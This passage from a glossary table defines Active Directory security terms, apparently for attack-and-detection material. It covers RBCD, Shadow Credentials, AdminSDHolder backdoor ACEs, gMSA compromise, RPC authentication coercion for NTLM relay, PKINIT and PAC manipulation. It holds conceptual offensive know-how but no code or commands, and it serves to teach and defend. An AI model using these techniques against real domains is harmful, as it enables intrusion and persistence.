| **RBCD (Resource-Based Constrained Delegation)** | Delegation model where the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute controls which computers can impersonate users to it via S4U. |
| **Shadow Credentials** | Attack abusing the `msDS-KeyCredentialLink` attribute to write a public key for PKINIT authentication, allowing authentication as the target without knowing or changing their password. |
| **AdminSDHolder** | AD object whose DACL is propagated every 60 minutes by SDProp to all "protected" accounts; a backdoor ACE here persists across individual account ACL remediations. |
| **gMSA (Group Managed Service Account)** | Service account type with automatically-rotated 240-byte random passwords managed by AD; compromise of an authorized reader yields the gMSA's NTLM hash. |
| **Authentication Coercion** | Technique using Windows RPC interfaces (MS-EFSRPC, MS-RPRN, MS-DFSNM, MS-FSRVP) to force a target machine to authenticate to an attacker-controlled endpoint for NTLM relay. |
| **Sigma Rule** | Platform-agnostic detection rule format that can be compiled to SIEM-specific query languages (Splunk SPL, KQL, Elastic EQL) for log-based threat detection. |
| **PKINIT** | Kerberos extension enabling certificate-based authentication; abused in ADCS attacks (ESC1) and Shadow Credentials to obtain TGTs without passwords. |
| **PAC (Privilege Attribute Certificate)** | Data structure within Kerberos tickets containing the user's SIDs, group memberships, and privileges; manipulated in SID history injection and Golden Ticket attacks. |
